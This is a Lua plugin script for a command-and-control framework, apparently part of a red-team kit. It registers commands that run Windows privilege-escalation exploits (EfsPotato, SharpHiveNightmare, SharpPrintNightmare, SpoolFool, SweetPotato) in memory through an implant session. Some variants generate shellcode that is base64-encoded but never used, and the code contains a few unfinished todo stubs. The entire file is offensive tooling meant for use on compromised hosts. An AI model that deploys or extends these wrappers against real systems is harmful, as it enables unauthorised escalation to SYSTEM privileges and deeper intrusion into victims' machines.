local time = require("time")
local strings = require("strings")
local rt = {}
rt.parent_command = "rt"
function new_sac()
    local sac = new_sacrifice(0,false,false,false,"")
end
local function command_register(command_name, command_function, help_string, ttp)
    command(rt.parent_command .. ":" .. command_name, command_function, help_string, ttp)
end

-- start EfsPotato_Net3.5.exe
function rt.EfsPotato_Net35(args)
    local session = active()
    local efspotato_path = "RTKit/Elevate/EfsPotato_Net3.5.exe"
    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
end
command_register("EfsPotato_Net3.5", rt.EfsPotato_Net35, "EfsPotato_Net35", "")
-- end EfsPotato_Net3.5.exe

-- start EfsPotato_Net3.5_CS.exe todo
function rt.EfsPotato_Net35_Shellcode(args)
    local session = active()
    local efspotato_path = "RTKit/Elevate/EfsPotato_Net3.5_CS.exe"
    local shellcode = payload_local() -- todo
    local b64_shellcode = base64_encode(shellcode)
    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
end
command_register("EfsPotato_Net3.5_Shellcode", rt.EfsPotato_Net35_Shellcode, "EfsPotato_Net35_Shellcode", "")
-- end EfsPotato_Net3.5_CS.exe

-- start EfsPotato_Net4.exe
function rt.EfsPotato_Net40(args)
    if #args ~= 1 then
        error("Usage: EfsPotato_Net4.0 <cmd>")
    end
    local session = active()
    local efspotato_path = "RTKit/Elevate/EfsPotato_Net4.0.exe"
    return execute_assembly(session, script_resource(efspotato_path), args, true, false, false)
end
command_register("EfsPotato_Net4.0", rt.EfsPotato_Net40, "EfsPotato_Net40", "")
-- end EfsPotato_Net4.exe

-- SharpHiveNightmare_Net4.5.exe
function rt.SharpHiveNightmare_Net45()
    local session = active()
    local sharphivenightmare_path = "RTKit/Elevate/SharpHiveNightmare_Net4.5.exe"
    return execute_assembly(session, script_resource(sharphivenightmare_path), {  }, true, false, false)
end
command_register("SharpHiveNightmare_Net4.5", rt.SharpHiveNightmare_Net45, "SharpHiveNightmare_Net45", "")
-- end SharpHiveNightmare_Net4.5.exe

-- SharpHiveNightmare_Net4.exe
function rt.SharpHiveNightmare_Net40()
    local session = active()
    local sharphivenightmare_path = "RTKit/Elevate/SharpHiveNightmare_Net4.0.exe"
    return execute_assembly(session, script_resource(sharphivenightmare_path), {  }, true, false, false)
end
command_register("SharpHiveNightmare_Net4.0", rt.SharpHiveNightmare_Net40, "SharpHiveNightmare_Net40", "")
-- end SharpHiveNightmare_Net4.exe

-- SharpPrintNightmare_Net4.5.exe
function rt.SharpPrintNightmare_Net45(args)
    local session = active()
    local sharpprintnightmare_path = "RTKit/Elevate/SharpPrintNightmare_Net4.5.exe"
    return execute_assembly(session, script_resource(sharpprintnightmare_path), { }, true, false, false)
end
command_register("SharpPrintNightmare_Net4.5", rt.SharpPrintNightmare_Net45, "SharpPrintNightmare_Net45", "")
-- end SharpPrintNightmare_Net4.5.exe

-- SharpPrintNightmare_Net4.exe
function rt.SharpPrintNightmare_Net40(args)
    local session = active()
    local sharpprintnightmare_path = "RTKit/Elevate/SharpPrintNightmare_Net4.0.exe"
    return execute_assembly(session, script_resource(sharpprintnightmare_path), { }, true, false, false)
end
command_register("SharpPrintNightmare_Net4.0", rt.SharpPrintNightmare_Net40, "SharpPrintNightmare_Net40", "")
-- end SharpPrintNightmare_Net4.exe

-- SpoolFool_Net4.exe
function rt.SpoolFool_Net40(args)
    local session = active()
    local spoolfool_path = "RTKit/Elevate/SpoolFool_Net4.0.exe"
    return execute_assembly(session, script_resource(spoolfool_path), args, true, false, false)
end
command_register("SpoolFool_Net4.0", rt.SpoolFool_Net40, "SpoolFool_Net40", "")
-- end SpoolFool_Net4.exe

-- SweetPotato4-46.exe
function rt.SweetPotato4_46(args)
    if #args ~= 2 then
        error("Usage: SweetPotato4-46 <cmd>")
    end
    local session = active()
    local sweetpotato_path = "RTKit/Elevate/SweetPotato4-46.exe"
    return execute_assembly(session, script_resource(sweetpotato_path), args, true, false, false)
end
command_register("SweetPotato4-46", rt.SweetPotato4_46, "SweetPotato4-46", "")
-- end SweetPotato4-46.exe

-- SweetPotato_CS.exe todo
function rt.SweetPotato_CS(args)
    local session = active()
    local sweetpotato_path = "RTKit/Elevate/SweetPotato_CS.exe"
    local shellcode = payload_local() -- todo
    local b64_shellcode = base64_encode(shellcode)
    return execute_assembly(session, script_resource(sweetpotato_path), args, true, false, false)
end
